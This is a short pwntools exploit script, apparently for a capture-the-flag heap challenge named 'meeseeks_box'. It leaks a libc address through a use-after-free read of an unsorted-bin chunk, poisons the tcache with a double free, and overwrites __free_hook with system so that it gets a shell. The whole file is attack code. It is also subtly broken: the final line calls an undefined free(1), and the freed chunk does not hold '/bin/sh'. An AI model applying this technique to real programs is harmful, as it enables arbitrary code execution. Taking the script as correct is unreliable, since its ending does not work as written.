from pwn import *

p = process("./meeseeks_box", env={"LD_PRELOAD": "./libc.so.6"})
elf = ELF("./meeseeks_box")
libc = ELF("libc.so.6")


def create(size, content):
	p.sendlineafter("> ", "1")
	p.sendlineafter(": ", str(size))
	p.sendlineafter(": ", content)

def show(idx):
	p.sendlineafter("> ", "2")
	p.sendlineafter(": ", str(idx))

def delete(idx):
	p.sendlineafter("> ", "3")
	p.sendlineafter(": ", str(idx))


create(0x500, "AAAA") # unsorted bin chunk 0
create(0x20, "BBBB")  # prevent top_chunk consolidation chunk 1

delete(0)

show(0)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
log.info(f"LIBC {hex(libc.address)}")

create(0x40, "CCCC") 
create(0x40, "DDDD") 

delete(2)
delete(2)

create(0x40, p64(libc.symbols['__free_hook']))
create(0x40, "/bin/sh\x00")
create(0x40, p64(libc.symbols['system']))


free(1)
p.interactive()